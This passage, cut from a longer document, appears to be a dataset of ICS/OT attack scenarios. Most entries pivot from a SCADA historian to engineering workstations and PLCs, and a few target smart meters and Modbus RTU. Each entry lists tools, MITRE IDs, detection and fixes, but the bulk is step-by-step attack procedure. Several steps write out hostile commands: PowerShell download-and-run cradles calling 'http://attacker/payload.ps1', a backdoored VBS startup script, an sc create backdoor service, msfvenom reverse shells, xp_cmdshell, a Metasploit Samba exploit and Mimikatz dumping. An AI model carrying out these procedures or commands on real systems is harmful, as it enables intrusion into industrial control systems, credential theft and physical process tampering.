- **Tools**: VNCViewer, ScreenConnect, Nmap
- **Scenario**: Historian configured to mirror Engineering Workstation sessions via RDP/VNC allows attacker to see and control OT actions.
- **Attack Steps**: Step 1: Nmap scan reveals open port 5901 on Historian.Step 2: Connects with VNCViewer using default password (admin).Step 3: Sees mirrored session of Engineering Workstation activity via screen share.Step 4: Observes login patterns and harvests credentials.Step 5: Launches own RDP session to Engineering system with credentials.Step 6: Performs logic modification on PLCs from engineering software.
- **Detection**: VNC logs, session duplication alerts
- **Solution**: Disable mirroring, change default credentials
- **Tags**: remote-screen, historian, visual-spy

## Historian DLL Injection for Persistent Pivot

- **Attack Type**: DLL Injection + Persistence
- **Target**: Historian Service Process
- **Vulnerability**: No DLL loading restrictions
- **MITRE**: T1055.001, T1546.010
- **Impact**: Long-term stealthy access via historian
- **Tools**: DLL Injector Tool, Process Hacker, rundll32.exe
- **Scenario**: Attacker injects custom DLL into Historian process to maintain access and control Engineering connections.
- **Attack Steps**: Step 1: Attacker has admin access to Historian.Step 2: Uses Process Hacker to enumerate running processes.Step 3: Selects SCADA historian service (HistorianSvc.exe).Step 4: Creates malicious DLL that spawns reverse shell using msfvenom.Step 5: Injects DLL using custom DLL Injector Tool or rundll32.Step 6: Reverse shell allows persistence and access to Engineering Workstation.Step 7: Injected code re-runs on every Historian reboot.
- **Detection**: DLL hash anomaly, process monitoring
- **Solution**: Code-sign DLLs, monitor unsigned DLLs
- **Tags**: dll-injection, persistence, pivot

## Historian Pivot via Unsecured SNMP Interface

- **Attack Type**: Information Disclosure & Exploitation
- **Target**: Historian SNMP Interface
- **Vulnerability**: SNMP v1, public string, no auth
- **MITRE**: T1046, T1087
- **Impact**: Enables hidden pivot path discovery
- **Tools**: SNMPWalk, SNMPUtil, Nmap
- **Scenario**: Attacker leverages open SNMP on Historian to gather sensitive routing and access data for lateral move.
- **Attack Steps**: Step 1: Attacker runs Nmap --script snmp-info on historian IP.Step 2: Finds SNMP port 161 open and public community string “public”.Step 3: Runs SNMPWalk to enumerate network topology.Step 4: Identifies route to Engineering VLAN.Step 5: Uses info to bypass firewall rules and reach Engineering Workstation.Step 6: Accesses Workstation over WinRM and loads reverse shell.
- **Detection**: SNMP traps, monitoring config
- **Solution**: Disable SNMP or use v3 with auth
- **Tags**: snmp, network-mapping, historian

## Historian Pivot via Batch Script Execution

- **Attack Type**: Remote Execution via Batch Upload
- **Target**: Historian Update Folder
- **Vulnerability**: Auto-exec of batch scripts
- **MITRE**: T1053, T1105
- **Impact**: Script abuse for lateral OT control
- **Tools**: Batch File, Windows Task Scheduler, CMD
- **Scenario**: Attacker uploads .bat file with malicious code to historian's update folder, auto-executed by scheduler.
- **Attack Steps**: Step 1: Historian auto-runs update scripts from local shared folder.Step 2: Attacker gains write access to this share.Step 3: Uploads batch script containing powershell.exe reverse shell.Step 4: Script executed automatically at midnight via Task Scheduler.Step 5: Attacker gets shell, scans network, and discovers Engineering Workstation.Step 6: Uses net use and copy to drop payload onto Workstation.Step 7: Executes remote command using WMI.
- **Detection**: Folder monitor, scheduled task logs
- **Solution**: Validate scripts, use signed updates
- **Tags**: batch, automation, historian, pivot

## Historian Exploit via Exploded JARs in Web Server

- **Attack Type**: Java Archive Exploitation
- **Target**: Historian Web Server
- **Vulnerability**: Writable JAR paths, class execution
- **MITRE**: T1059.005, T1505.003
- **Impact**: Java execution leading to pivot
- **Tools**: Burp Suite, Java Decompiler, JAR Explorer
- **Scenario**: Historian hosts web server with unpacked .jar files allowing attacker to overwrite class files.
- **Attack Steps**: Step 1: Historian web portal serves .jar content.Step 2: Attacker uses Burp Suite to analyze file paths and parameters.Step 3: Finds exploded directory accessible: http://historian/jars/logs/.Step 4: Decompiles target class with Java Decompiler.Step 5: Modifies logic in Java file to launch reverse shell.Step 6: Repackages and re-uploads .class file into exposed path.Step 7: Payload runs when class is invoked via Engineer interface.
- **Detection**: File diff monitoring, Java audit logs
- **Solution**: Restrict file write permissions
- **Tags**: jar, java, webserver, historian

## Historian Pivot through Open PowerShell Remoting

- **Attack Type**: PowerShell Remoting Abuse
- **Target**: Historian PowerShell
- **Vulnerability**: WinRM exposed, unrestricted access
- **MITRE**: T1059.001, T1021.006
- **Impact**: Easy script-based pivot path
- **Tools**: PowerShell, WinRM, Invoke-Command
- **Scenario**: Historian configured with enabled PowerShell remoting lets attacker control system and pivot.
- **Attack Steps**: Step 1: Attacker runs Get-PSSessionConfiguration on historian to confirm PowerShell remoting enabled.Step 2: Sends reverse shell with Invoke-Command -ScriptBlock.Step 3: Connects to Engineering Workstation using domain credentials.Step 4: Runs reconnaissance commands: Get-Process, Get-Service.Step 5: Uploads payload using Invoke-WebRequest to Engineering Workstation.Step 6: Executes script to interact with PLC tools.
- **Detection**: PowerShell logs, WinRM audit
- **Solution**: Limit PowerShell to admins
- **Tags**: powershell, remoting, historian

## Historian Role Escalation via Unquoted Service Path

- **Attack Type**: Path Hijack → Admin Control
- **Target**: Historian Service Path
- **Vulnerability**: Unquoted service path
- **MITRE**: T1574.009, T1055
- **Impact**: Escalation leading to full OT compromise
- **Tools**: PowerUp, Process Explorer, CMD
- **Scenario**: Unquoted path in Historian service allows attacker to place malicious .exe and gain control.
- **Attack Steps**: Step 1: Attacker runs PowerUp.ps1 to enumerate vulnerable services.Step 2: Finds service with unquoted path: C:\Program Files\Historian Service\Logger.exe.Step 3: Places malicious Historian.exe in C:\Program Files\.Step 4: Restarts service to execute attacker’s binary.Step 5: Malicious executable runs under SYSTEM.Step 6: Attacker uses SYSTEM shell to connect to Engineering Workstation and dump credentials.
- **Detection**: Service audit, executable anomaly
- **Solution**: Quote paths, restrict file drop locations
- **Tags**: path-hijack, service-escalation, historian

## Historian Used for ARP Spoofing Pivot

- **Attack Type**: MITM & Lateral Pivot
- **Target**: Historian Dual NIC
- **Vulnerability**: No ARP inspection, flat network
- **MITRE**: T1040, T1557
- **Impact**: Silent interception of engineering data
- **Tools**: Ettercap, ARP Spoof, Wireshark
- **Scenario**: Attacker abuses Historian’s dual network interfaces to perform ARP spoofing between Engineering Workstation and PLCs.
- **Attack Steps**: Step 1: Attacker identifies that Historian is connected to both IT and OT subnets.Step 2: Installs Ettercap on the Historian system.Step 3: Launches ARP spoofing attack, impersonating gateway to Engineering Workstation.Step 4: Engineering Workstation unknowingly routes traffic via Historian.Step 5: Attacker inspects traffic using Wireshark and extracts sensitive session data.Step 6: Replays credentials to gain access to engineering software.Step 7: Uses MITM to inject control commands to PLCs.
- **Detection**: Duplicate MAC detection, network scan
- **Solution**: VLAN separation, ARP inspection
- **Tags**: arp-spoof, mitm, historian

## Historian FTP Pivot via Anonymous Upload

- **Attack Type**: Remote Shell via FTP Exploitation
- **Target**: Historian FTP Server
- **Vulnerability**: Anonymous write, no execution control
- **MITRE**: T1105, T1059.001
- **Impact**: Remote code execution and pivot
- **Tools**: FTP client, Netcat, Python HTTP Server
- **Scenario**: Historian has FTP enabled with anonymous write access, allowing upload of web shell or reverse shell script.
- **Attack Steps**: Step 1: Attacker finds open FTP port (21) on Historian using Nmap.Step 2: Logs in with username anonymous.Step 3: Uploads a malicious .bat or .ps1 script using basic FTP client.Step 4: Starts Python HTTP Server and triggers script execution via browser or task scheduler.Step 5: Payload launches reverse shell back to attacker.Step 6: Attacker laterally connects to Engineering Workstation using net use and credentials.Step 7: Loads unauthorized logic to the PLC using engineering software.
- **Detection**: FTP logs, unauthorized script detection
- **Solution**: Disable anonymous FTP, file scan automation
- **Tags**: ftp, script-upload, pivot

## Pivoting via Historian Connected USB HMI Tool

- **Attack Type**: Toolchain Abuse via Historian Access
- **Target**: Historian USB Port
- **Vulnerability**: Unverified HMI project files
- **MITRE**: T1200, T1027
- **Impact**: Backdoor into entire HMI logic flow
- **Tools**: USB Rubber Ducky, Malicious HMI Project File, Vendor Software
- **Scenario**: Historian is used to update HMI devices via USB, attacker loads infected update file.
- **Attack Steps**: Step 1: Attacker knows Historian is used to push updates to HMIs via USB.Step 2: Crafts malicious HMI project file with backdoor logic using vendor software.Step 3: Loads payload into USB Rubber Ducky or flash drive.Step 4: Insider plugs USB into Historian.Step 5: Engineer unknowingly transfers file to actual HMI via Historian.Step 6: Backdoor is triggered remotely from Historian once HMI is connected.Step 7: Engineering Workstation reads altered HMI state, allowing pivot.
- **Detection**: HMI config mismatch, USB audits
- **Solution**: Validate project files, use signing
- **Tags**: hmi, usb, historian, backdoor

## Historian Pivot via Scripted Remote Debugging

- **Attack Type**: Remote Debugging Abuse
- **Target**: Historian & Engineer Script
- **Vulnerability**: Enabled debugging, poor auth control
- **MITRE**: T1059.001, T1547
- **Impact**: Runtime control of Engineer logic
- **Tools**: PowerShell, Enter-PSHostProcess, Debugger
- **Scenario**: Historian has PowerShell remote debugging enabled; attacker attaches to Engineering script process remotely.
- **Attack Steps**: Step 1: Historian has Enable-PSRemoting active.Step 2: Attacker executes Get-Process to list remote processes on Engineering Workstation.Step 3: Finds active automation script in PowerShell on Engineer system.Step 4: Uses Enter-PSHostProcess to attach debugger.Step 5: Runs inline commands to extract sensitive variables (passwords, logic states).Step 6: Modifies script execution to add reverse shell payload.Step 7: Executes updated script, opening persistent pivot.
- **Detection**: PS logs, process debugging traces
- **Solution**: Disable PS debugging in prod
- **Tags**: powershell, debugger, historian

## Pivot via Historian-Linked Printer Exploit

- **Attack Type**: Print Spoofing and Code Execution
- **Target**: Historian Shared Printer
- **Vulnerability**: Vulnerable shared printer driver
- **MITRE**: T1210, T1203
- **Impact**: Exploit cascade via shared resource
- **Tools**: Printer Exploit Toolkit, LPR.exe, Cobalt Strike
- **Scenario**: Attacker uses shared printer driver on Historian to drop payload on Engineering systems via driver vulnerability.
- **Attack Steps**: Step 1: Historian and Engineering Workstation share the same network printer.Step 2: Attacker exploits known vulnerability in printer driver (via Printer Exploit Toolkit).Step 3: Sends crafted print job using LPR.exe to execute code on Historian.Step 4: Once payload is dropped, attacker scans for other users mapped to same printer.Step 5: Uses stolen credentials to pivot to Engineering Workstation.Step 6: Installs Cobalt Strike beacon for persistent access.Step 7: Begins manipulating PLC/HMI files.
- **Detection**: Printer logs, service calls
- **Solution**: Patch drivers, limit print sharing
- **Tags**: printer-exploit, pivot, driver

## Historian Pivot via WMI Infection Chain

- **Attack Type**: WMI Lateral Execution
- **Target**: Historian WMI Service
- **Vulnerability**: Unrestricted WMI remote execution
- **MITRE**: T1047, T1059.001
- **Impact**: Remote control over Engineering system
- **Tools**: WMImplant, WMIExec.py, Metasploit
- **Scenario**: Attacker uses WMI on Historian to execute payload remotely on Engineering Workstation.
- **Attack Steps**: Step 1: Historian compromised, attacker installs WMImplant.Step 2: Uses Get-WmiObject to enumerate available targets.Step 3: Finds Engineering Workstation via Win32_ComputerSystem.Step 4: Launches Invoke-WmiMethod to trigger script download and execution.Step 5: Engineering Workstation executes PowerShell payload hosted on attacker’s server.Step 6: Metasploit handler receives shell.Step 7: Modifies configuration via engineering software.
- **Detection**: WMI audit logs, connection tracing
- **Solution**: Disable external WMI, log invocations
- **Tags**: wmi, pivot, powershell

## Historian Pivot via Local Port Forwarding

- **Attack Type**: SSH Tunnel Pivot
- **Target**: Historian SSH Access
- **Vulnerability**: SSH port forwarding not blocked
- **MITRE**: T1572, T1090
- **Impact**: Hidden tunnel into protected OT
- **Tools**: PuTTY/Plink, SSH, ProxyChains
- **Scenario**: Historian used as SSH pivot point to route traffic into isolated OT subnet containing Engineering systems.
- **Attack Steps**: Step 1: Attacker accesses Historian via compromised SSH service.Step 2: Runs Plink to set up local port forwarding (plink -L 8080:engineering_pc:3389).Step 3: Configures ProxyChains to route traffic through SSH tunnel.Step 4: Attacker accesses RDP service on Engineering Workstation via forwarded port.Step 5: Authenticates using stolen credentials.Step 6: Begins making system changes and installing malware.Step 7: Engineer tools are compromised silently.
- **Detection**: New tunnel logs, forwarded port alerts
- **Solution**: Block SSH tunneling, log SSH activity
- **Tags**: ssh-tunnel, port-forward, pivot

## Historian Pivot via Environment Variable Poisoning

- **Attack Type**: Hijack Engineer App via Env Injection
- **Target**: Historian Sync Folder
- **Vulnerability**: Shared startup and PATH variable
- **MITRE**: T1037, T1546
- **Impact**: Engineer executes fake tools silently
- **Tools**: Setx, PowerShell, Startup Scripts
- **Scenario**: Attacker poisons environment variables on Historian that affect scripting behavior on shared engineer tools.
- **Attack Steps**: Step 1: Historian and Engineering systems sync startup scripts.Step 2: Attacker modifies .env or registry variable via setx PATH.Step 3: Adds attacker-controlled script path at the beginning of PATH.Step 4: Engineering tool launched by Engineer uses attacker’s version first.Step 5: Malicious tool spawns shell and opens reverse connection.Step 6: Attacker escalates privileges and installs persistence.Step 7: Hidden control achieved via normal engineer routine.
- **Detection**: Path audit, registry diff check
- **Solution**: Restrict env edits, code signing
- **Tags**: path-poison, environment, pivot

## Historian Pivot Using Windows LNK File Execution

- **Attack Type**: Shortcut Backdoor Deployment
- **Target**: Historian Desktop Shortcuts
- **Vulnerability**: No file integrity checks
- **MITRE**: T1204.002, T1059.003
- **Impact**: Shortcut activates remote code
- **Tools**: msfvenom, Shellter, PowerShell
- **Scenario**: Historian desktop has shared LNK shortcuts used by engineers. Attacker replaces them with backdoored versions.
- **Attack Steps**: Step 1: Attacker accesses Historian desktop folder.Step 2: Creates LNK file pointing to hidden reverse shell payload using msfvenom -p windows/shell_reverse_tcp.Step 3: Uses Shellter to make payload FUD (fully undetectable).Step 4: Replaces genuine shortcut with backdoored version (e.g., HMI Editor.lnk).Step 5: Engineer clicks shortcut; reverse shell opens.Step 6: Attacker connects back and pivots to Engineering tools.Step 7: Executes commands and deploys malicious project files.
- **Detection**: AV detection, shortcut hash mismatch
- **Solution**: Validate shortcuts, restrict desktop access
- **Tags**: lnk-file, backdoor, historian

## Historian Pivot Using SCADA VPN Credentials

- **Attack Type**: VPN Credential Theft & Replay
- **Target**: Historian VPN Profile
- **Vulnerability**: Stored credentials, no MFA
- **MITRE**: T1552.004, T1078
- **Impact**: Remote access to OT from attacker PC
- **Tools**: OpenVPN, Mimikatz, Windows File Explorer
- **Scenario**: Historian stores VPN profile for remote access, attacker steals .ovpn and credentials.
- **Attack Steps**: Step 1: Historian stores OpenVPN configuration file with saved credentials.Step 2: Attacker navigates to C:\Users\Engineer\AppData\Roaming\OpenVPN\config.Step 3: Extracts .ovpn file and saved password hash.Step 4: Runs Mimikatz to dump clear-text VPN credentials from memory.Step 5: Installs OpenVPN on attacker machine, imports stolen config.Step 6: Connects to OT VPN endpoint.Step 7: Accesses Engineering Workstation as if remote Engineer.
- **Detection**: VPN logs, off-hours connection
- **Solution**: Enforce MFA, encrypt config files
- **Tags**: vpn, credential-theft, historian

## Historian Used for SMB Relay to Engineer System

- **Attack Type**: SMB Exploitation for Pivot
- **Target**: Historian (Relay Server)
- **Vulnerability**: LLMNR/NetBIOS enabled, SMB signing disabled
- **MITRE**: T1557.001, T1021.002
- **Impact**: Credential-less remote command execution
- **Tools**: Responder, NTLMRelayX, CrackMapExec
- **Scenario**: Historian relays SMB authentication attempts to Engineering Workstation, allowing command execution without credentials.
- **Attack Steps**: Step 1: Attacker runs Responder on Historian to poison LLMNR and NBNS traffic.Step 2: Historian receives authentication requests meant for Engineer’s printer share.Step 3: Attacker uses NTLMRelayX to forward hashes to Engineering Workstation.Step 4: Engineer machine accepts the relayed credentials, allowing command execution.Step 5: Attacker runs whoami and ipconfig remotely.Step 6: Uploads and executes malicious engineering payload via SMB share.Step 7: Maintains persistent access to Engineering Workstation.
- **Detection**: SMB logs, responder traffic
- **Solution**: Disable LLMNR/NetBIOS, enforce SMB signing
- **Tags**: smb-relay, relay-attack, historian

## Historian Pivot via Engineering Tool Plugin Abuse

- **Attack Type**: Plugin Hijack for Remote Access
- **Target**: Historian Plugin Folder
- **Vulnerability**: Insecure plugin loading, DLL sideloading
- **MITRE**: T1574.002, T1055.001
- **Impact**: Remote execution via trusted engineering tools
- **Tools**: Custom DLL, rundll32, Process Monitor
- **Scenario**: Engineering software on Historian loads DLL plugins from insecure folder, allowing attacker to inject malicious modules.
- **Attack Steps**: Step 1: Attacker identifies Engineer Tool (e.g., Siemens TIA) installed on Historian.Step 2: Uses Process Monitor to trace plugin folder (C:\Program Files\TIA\Plugins).Step 3: Crafts malicious DLL using Visual Studio and embeds reverse shell.Step 4: Replaces or adds DLL to plugin folder.Step 5: Engineer tool loads plugin automatically during startup.Step 6: DLL spawns reverse shell to attacker.Step 7: Attacker pivots to connected Engineering Workstation via Historian network path.
- **Detection**: DLL signature mismatch, reverse shell traffic
- **Solution**: Code-sign plugins, validate folder contents
- **Tags**: plugin-hijack, dll, engineer-tool

## Historian Pivot via SSH Authorized Key Injection

- **Attack Type**: SSH Key Abuse for Lateral Access
- **Target**: Historian Linux Interface
- **Vulnerability**: SSH allowed, weak key management
- **MITRE**: T1098.004, T1021.004
- **Impact**: Persistent access, pivot to Engineering
- **Tools**: SSH, echo, Nano, SCP
- **Scenario**: Historian has SSH access enabled. Attacker adds SSH key to authorized_keys for remote pivoting.
- **Attack Steps**: Step 1: Attacker gains shell on Historian.Step 2: Creates RSA keypair using ssh-keygen.Step 3: Appends public key to ~/.ssh/authorized_keys on Historian.Step 4: Uses SSH for persistent, password-less login.Step 5: Uses SCP to transfer payload to Engineering system (scp payload.sh user@engIP:/tmp).Step 6: Executes the script via SSH.Step 7: Payload modifies PLC control logic and creates backdoor for future use.
- **Detection**: SSH key scan, .ssh integrity
- **Solution**: Rotate keys, restrict user access
- **Tags**: ssh-key, auth-injection, historian

## Historian DNS Poisoning for Engineering Redirection

- **Attack Type**: Malicious DNS Reply to Divert Engineers
- **Target**: Historian DNS Resolver
- **Vulnerability**: No DNS integrity checks
- **MITRE**: T1557.002, T1071.004
- **Impact**: Credential capture, traffic redirection
- **Tools**: DnsChef, Hosts File, Burp Suite
- **Scenario**: Attacker poisons DNS entries on Historian, redirecting Engineering Workstation to fake SCADA server.
- **Attack Steps**: Step 1: Historian configured as internal DNS resolver.Step 2: Attacker installs DnsChef to forge DNS replies.Step 3: Sets SCADA-related domains (e.g., hmi.company.local) to attacker’s IP.Step 4: Engineering Workstation queries Historian for hostname resolution.Step 5: It connects to attacker’s fake HMI interface (served via Burp Suite).Step 6: Engineer unknowingly enters credentials.Step 7: Attacker reuses credentials for remote access.
- **Detection**: DNS mismatch alerts, DNS logs
- **Solution**: Secure DNS, disable DNS forwarding
- **Tags**: dns-poison, fake-hmi, historian

## Historian Used for Drive Mapping Lateral Movement

- **Attack Type**: Mapped Drive Abuse
- **Target**: Engineer Mapped Drive
- **Vulnerability**: Writeable network paths
- **MITRE**: T1021.002, T1059.001
- **Impact**: Remote script delivery and privilege gain
- **Tools**: net use, PowerShell, PsExec
- **Scenario**: Historian has mapped drive to Engineer system, used by attacker for payload delivery and script execution.
- **Attack Steps**: Step 1: From Historian, attacker uses net use to enumerate mapped drives.Step 2: Finds Z: mapped to \\engineering-pc\shared.Step 3: Uploads malware.ps1 to the mapped drive.Step 4: Uses PsExec to execute powershell.exe -File \\Z:\malware.ps1.Step 5: Script creates a new local user with admin rights on Engineering system.Step 6: Attacker logs into Engineer system using new account.Step 7: PLC/HMI config changes made.
- **Detection**: Shared folder audit, new user logs
- **Solution**: Disable auto-mounting shared drives
- **Tags**: drive-map, pivot, script-execution

## Historian Pivot via COM Object Hijack

- **Attack Type**: Windows COM Object Abuse
- **Target**: Historian DCOM Registry
- **Vulnerability**: COM hijacking via shared object
- **MITRE**: T1117, T1546.015
- **Impact**: Execution via SCADA application interface
- **Tools**: JScript, dcomperm, COMRaider
- **Scenario**: Attacker hijacks COM object used by SCADA application to launch payload on Engineering Workstation.
- **Attack Steps**: Step 1: Engineer application uses DCOM to communicate with Historian.Step 2: Attacker uses COMRaider to find exploitable CLSID.Step 3: Registers malicious COM DLL under same CLSID using regsvr32.Step 4: When Engineering app calls DCOM object, malicious DLL is executed.Step 5: DLL spawns a reverse shell back to attacker.Step 6: Attacker executes commands to interact with PLC programming software.Step 7: Modifies or extracts control logic.
- **Detection**: Registry change detection, DLL hash alert
- **Solution**: Block DCOM, audit object creation
- **Tags**: com-hijack, dcom, historian

## Historian Pivot via Engineering Tool Auto-Update Spoof

- **Attack Type**: Update Spoofing for Remote Access
- **Target**: Historian Engineering Tool
- **Vulnerability**: Unsigned, unauthenticated updates
- **MITRE**: T1071.001, T1554
- **Impact**: Remote payload delivery via update
- **Tools**: Evilgrade, mitmproxy, Fake Update Server
- **Scenario**: Historian downloads engineering tool updates over HTTP; attacker spoofs update server to deliver malware.
- **Attack Steps**: Step 1: Attacker runs mitmproxy or sets up fake DNS to redirect update check.Step 2: Historian engineer tool checks for update on startup.Step 3: Attacker uses Evilgrade to respond with modified update.Step 4: Update includes backdoor that runs on next application start.Step 5: Backdoor opens reverse shell.Step 6: Attacker laterally accesses Engineering system and runs payload.Step 7: Remote PLC programming tools compromised.
- **Detection**: Outbound HTTP logs, file hash mismatch
- **Solution**: Use signed updates, HTTPS only
- **Tags**: spoof-update, mitm, historian

## Historian Pivot via Misconfigured Docker Socket

- **Attack Type**: Docker RCE & Container Breakout
- **Target**: Historian Docker Service
- **Vulnerability**: Docker socket exposed, host mount
- **MITRE**: T1611, T1059
- **Impact**: Full system control from container
- **Tools**: Docker CLI, Curl, Alpine Container, nsenter
- **Scenario**: Historian runs Docker with exposed socket, attacker uses it to gain root and pivot.
- **Attack Steps**: Step 1: Attacker finds open Docker socket via curl --unix-socket.Step 2: Creates new container with mount to root filesystem (-v /:/mnt).Step 3: Enters container shell and uses chroot /mnt to break into host.Step 4: From host, installs SSH key for persistent login.Step 5: Scans local network and finds Engineering Workstation.Step 6: SSHs into it using reused credentials or passwordless access.Step 7: Compromises engineering tools.
- **Detection**: Docker socket scan, unusual container mounts
- **Solution**: Block Docker.sock, use rootless containers
- **Tags**: docker, rce, container-breakout

## Historian Pivot via Malicious .LDF Injection

- **Attack Type**: SQL Server Log File Exploit
- **Target**: Historian SQL Server
- **Vulnerability**: Unvalidated log file reuse
- **MITRE**: T1505.002, T1059.005
- **Impact**: Stealthy RCE via DB restore
- **Tools**: Hex Editor, SQL Server, PowerShell
- **Scenario**: Attacker replaces .ldf (SQL log file) of Historian DB to force execution during next restore.
- **Attack Steps**: Step 1: Attacker stops Historian SQL Server process.Step 2: Replaces historian.ldf with crafted version using Hex Editor.Step 3: Injects SQL commands like EXEC xp_cmdshell 'powershell -c reverse shell'.Step 4: Restarts SQL Server — log file triggers command execution.Step 5: Payload gives shell to attacker.Step 6: Uses Invoke-Command to scan and pivot to Engineering Workstation.Step 7: Modifies PLC data tables.
- **Detection**: SQL logs, unexpected shell events
- **Solution**: Disable xp_cmdshell, verify backups
- **Tags**: sql-ldf, db-exploit, historian

## Historian Pivot via Scheduled Task Race Condition

- **Attack Type**: Race Condition Task Hijack
- **Target**: Historian Task Scheduler
- **Vulnerability**: Task path writable, no script integrity
- **MITRE**: T1053.005, T1564.001
- **Impact**: Race condition to execute malware
- **Tools**: Task Scheduler, ProcMon, PowerShell
- **Scenario**: Attacker intercepts and modifies a scheduled task script during execution window.
- **Attack Steps**: Step 1: Attacker runs ProcMon to monitor file access by scheduled task.Step 2: Finds engineerTask.ps1 executed every 5 minutes from shared folder.Step 3: Waits for scheduled access, then briefly replaces script with malicious version.Step 4: Task executes attacker’s payload.Step 5: Quickly restores original script to avoid detection.Step 6: Reverse shell connects back.Step 7: Attacker pivots to Engineering system and establishes persistence.
- **Detection**: Task execution logs, file diff monitoring
- **Solution**: Lockdown scheduled scripts
- **Tags**: task-race, hijack, historian

## Historian Pivot via Remote WQL Query Abuse

- **Attack Type**: WMI Query Enumeration & Remote Action
- **Target**: Historian to Engineering via WMI
- **Vulnerability**: WMI allowed without restrictions
- **MITRE**: T1047, T1059.001
- **Impact**: Silent remote access via system calls
- **Tools**: PowerShell, WMI Explorer, WMIC
- **Scenario**: Attacker uses Historian’s access to query and remotely interact with Engineering Workstation via WMI and WQL.
- **Attack Steps**: Step 1: Attacker gains shell on Historian.Step 2: Runs Get-WmiObject -List to discover WMI classes.Step 3: Uses WMI Explorer to test remote access to Engineering Workstation via WQL query: SELECT * FROM Win32_Process.Step 4: Confirms ability to view running processes remotely.Step 5: Executes remote process on Engineering Workstation: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell.exe -c IEX(New-Object Net.WebClient).DownloadString("http://attacker/payload.ps1")'.Step 6: Attacker’s payload executes silently and opens shell back.Step 7: Engineering control software accessed and manipulated.
- **Detection**: WMI logs, unauthorized process creation
- **Solution**: Limit WMI access, enforce remote auth controls
- **Tags**: wmi, remote-execution, historian

## Historian Pivot via Insecure VBS Script Execution

- **Attack Type**: Script Injection into Auto-Run Task
- **Target**: Engineering Workstation Startup Script
- **Vulnerability**: Writable auto-executed scripts
- **MITRE**: T1053.005, T1059.005
- **Impact**: Persistent stealthy pivot on reboot
- **Tools**: Notepad++, PowerShell, VBScript
- **Scenario**: Engineering Workstation runs .vbs from shared folder auto-executed on startup. Attacker modifies it using Historian.
- **Attack Steps**: Step 1: Historian and Engineering Workstation share \\shared\scripts\start.vbs.Step 2: Attacker opens .vbs using Notepad++.Step 3: Appends VBScript code to launch PowerShell reverse shell: CreateObject("Wscript.Shell").Run "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')".Step 4: Saves modified .vbs.Step 5: On next boot, Engineering Workstation executes the altered script.Step 6: Payload runs in background, attacker gains shell.Step 7: SCADA/HMI applications modified silently.
- **Detection**: File hash checks, startup script alerts
- **Solution**: Restrict shared script editing, sign scripts
- **Tags**: vbs, startup, script-injection

## Historian Pivot via Service Creation Exploit

- **Attack Type**: Remote Service Creation
- **Target**: Engineering Workstation Windows Services
- **Vulnerability**: RPC & remote service creation allowed
- **MITRE**: T1543.003, T1050
- **Impact**: Malware runs as persistent system service
- **Tools**: PsExec, SCMUtl, PowerShell
- **Scenario**: Attacker creates new Windows service on Engineering Workstation from Historian to run malware persistently.
- **Attack Steps**: Step 1: From Historian, attacker runs PsExec \\engineering_pc cmd using known credentials.Step 2: Uses sc create command to set up malicious service: sc create engBackdoor binPath= "cmd /c powershell -EncodedCommand [payload]".Step 3: Configures service to auto-start with sc config engBackdoor start= auto.Step 4: Starts the service via sc start engBackdoor.Step 5: Payload launches and connects to attacker’s server.Step 6: Attacker interacts with Engineering software remotely.Step 7: Service remains hidden unless specifically audited.
- **Detection**: New service logs, WinRM alerts
- **Solution**: Limit service creation rights, monitor logs
- **Tags**: service-creation, pivot, historian

## Historian Pivot via HMI Project File Loader

- **Attack Type**: Malicious Project File Execution
- **Target**: HMI Project File
- **Vulnerability**: Unrestricted scripting in config files
- **MITRE**: T1204.002, T1059.001
- **Impact**: Remote control via HMI scripting engine
- **Tools**: Vendor HMI Editor, PowerShell, Hex Editor
- **Scenario**: Historian stores shared HMI configuration files. Attacker modifies project file to include malicious macro or script.
- **Attack Steps**: Step 1: Attacker finds .hmi project file in shared folder (e.g., \\hist-server\HMI_Projects\current.hmi).Step 2: Opens file in HMI Editor and injects PowerShell macro: Execute("powershell.exe -c (New-Object Net.WebClient).DownloadString('http://attacker/mal.ps1')").Step 3: Saves project and leaves timestamp unchanged to avoid suspicion.Step 4: Engineer opens file using HMI Editor.Step 5: Macro runs immediately or on preview mode.Step 6: Malware connects back to attacker.Step 7: Compromise allows attacker to reprogram live HMI.
- **Detection**: Macro detection, file diffing
- **Solution**: Disable macros, validate config content
- **Tags**: hmi-macro, project-hijack, historian

## Historian Pivot via Exploited Samba Share

- **Attack Type**: SMB Exploit for Remote Code Execution
- **Target**: Historian SMB Service
- **Vulnerability**: Unpatched Samba version
- **MITRE**: T1210, T1068
- **Impact**: External shell, full pivot to OT systems
- **Tools**: Metasploit, SMB Exploit Module, Nmap
- **Scenario**: Historian shares files over vulnerable Samba version; attacker exploits buffer overflow for shell access and pivot.
- **Attack Steps**: Step 1: Attacker scans Historian using nmap -p 445 --script smb-vuln*.Step 2: Confirms vulnerable Samba version (e.g., CVE-2017-7494).Step 3: Loads exploit module in Metasploit (exploit/linux/samba/is_known_pipename).Step 4: Sets payload as reverse shell and targets Historian IP.Step 5: Exploit delivers shell.Step 6: From Historian, attacker scans and connects to Engineering Workstation using net use or PsExec.Step 7: Attacker installs remote command tool and pivots to control PLCs.
- **Detection**: SMB exploit logs, unusual traffic
- **Solution**: Patch Samba, restrict file shares
- **Tags**: samba, smb-exploit, pivot

## Zigbee-Based Smart Meter Interception

- **Attack Type**: Wireless Interception
- **Target**: Smart Meter
- **Vulnerability**: Unencrypted Zigbee traffic
- **MITRE**: T1040 - Network Sniffing
- **Impact**: Tampering with utility billing data
- **Tools**: KillerBee, RZUSBstick, Wireshark
- **Scenario**: Attacker targets smart meters using Zigbee protocol to read energy data and inject false readings.
- **Attack Steps**: Step 1: Place Zigbee-compatible sniffer (e.g., RZUSBstick) near smart meter.Step 2: Use KillerBee's zbid to detect nearby Zigbee networks.Step 3: Capture communication using zbdump to log packets.Step 4: Analyze captured packets with Wireshark for unencrypted data.Step 5: Replay modified packets using zbplay to inject false readings.Step 6: Confirm changes in smart meter system interface or logs.
- **Detection**: Monitor RF traffic for unknown devices, inspect Zigbee logs
- **Solution**: Use Zigbee encryption (AES-128), monitor physical proximity
- **Tags**: Zigbee, Smart Meter, RF, KillerBee

## Serial Modbus RTU Command Injection

- **Attack Type**: Serial Protocol Injection
- **Target**: PLC/RTU
- **Vulnerability**: Lack of authentication in serial Modbus
- **MITRE**: T0851.001 - Modbus
- **Impact**: Actuator manipulation
- **Tools**: USB to RS-485 adapter, ModbusPal, modpoll
- **Scenario**: Attacker physically connects to RS-485 line of a Modbus RTU system to send unauthorized commands.
